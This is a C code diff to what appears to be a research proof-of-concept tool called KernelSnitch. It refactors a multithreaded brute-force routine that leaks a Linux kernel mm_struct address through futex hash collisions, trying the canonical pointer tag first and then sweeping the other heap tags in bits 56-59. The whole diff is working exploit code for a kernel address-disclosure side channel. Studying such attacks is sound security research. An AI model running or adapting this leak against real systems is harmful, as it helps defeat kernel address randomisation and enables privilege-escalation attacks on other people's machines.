@@ -199,7 +199,27 @@ struct range {
 struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
+    int try_canonical;
+    int sweep_tags;
 };
+
+static int __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate)
+{
+    for (size_t i = 1; i < ks->collisions; ++i) {
+        if (futex_hash(ks->futex_addrs[0], candidate) != futex_hash(ks->futex_addrs[i], candidate))
+            return 0;
+    }
+    return 1;
+}
+
+static void __mm_mark_found(struct kernelsnitch_shared_state *ks, size_t candidate)
+{
+    if (ks->verbose)
+        pr_info("found mm_struct %016zx\n", candidate);
+    ks->mm_struct = candidate;
+    ks->found = 1;
+}
+
 static void *__mm_leak(void *arg)
 {
     struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
@@ -213,21 +233,23 @@ static void *__mm_leak(void *arg)
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
-                size_t found_hash = 1;
-                // Sweep every heap tag in bits 56-59.
-                // The canonical pointer is tag 15, so try it first.
-                for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
-                    size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
-                    __mm_struct_candidate |= (((15 + tag_candidate) & 0xf) << 56);
-                    found_hash = 1;
-                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                        found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
-                    if (found_hash) {
-                        if (ks->verbose)
-                            pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
-                        ks->mm_struct = __mm_struct_candidate;
-                        ks->found = 1;
+                if (mm_leak_arg->try_canonical) {
+                    size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
+                    if (__mm_candidate_matches(ks, canonical_candidate)) {
+                        __mm_mark_found(ks, canonical_candidate);
                         break;
+                    }
+                }
+
+                if (mm_leak_arg->sweep_tags) {
+                    for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
+                        if (tag_candidate == 15)
+                            continue;
+                        size_t tagged_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (tag_candidate << 56);
+                        if (__mm_candidate_matches(ks, tagged_candidate)) {
+                            __mm_mark_found(ks, tagged_candidate);
+                            break;
+                        }
                     }
                 }
             }
@@ -235,6 +257,26 @@ static void *__mm_leak(void *arg)
     }
     free(mm_leak_arg);
     return 0;
+}
+
+static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_canonical, int sweep_tags)
+{
+    for (size_t i = 0; i < ks->thread_cnt; ++i) {
+        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
+        mm_leak_arg->ks = ks;
+        mm_leak_arg->range.id = i;
+        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
+        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
+        mm_leak_arg->try_canonical = try_canonical;
+        mm_leak_arg->sweep_tags = sweep_tags;
+        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
+            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
+        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
+            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
+        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
+    }
+    for (size_t i = 0; i < ks->thread_cnt; ++i)
+        pthread_join(ks->tids[i], 0);
 }
 
 /****************************************************************************************************************/
@@ -505,20 +547,9 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     if (ks->verbose) pr_info("start bruteforcing\n");
     reset_cpu_pin();
 
-    for (size_t i = 0; i < ks->thread_cnt; ++i) {
-        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
-        mm_leak_arg->ks = ks;
-        mm_leak_arg->range.id = i;
-        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
-        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
-        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
-            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
-        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
-            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
-        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
-    }
-    for (size_t i = 0; i < ks->thread_cnt; ++i)
-        pthread_join(ks->tids[i], 0);
+    __run_mm_leak_pass(ks, 1, 0);
+    if (!ks->found)
+        __run_mm_leak_pass(ks, 0, 1);
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
 }
 
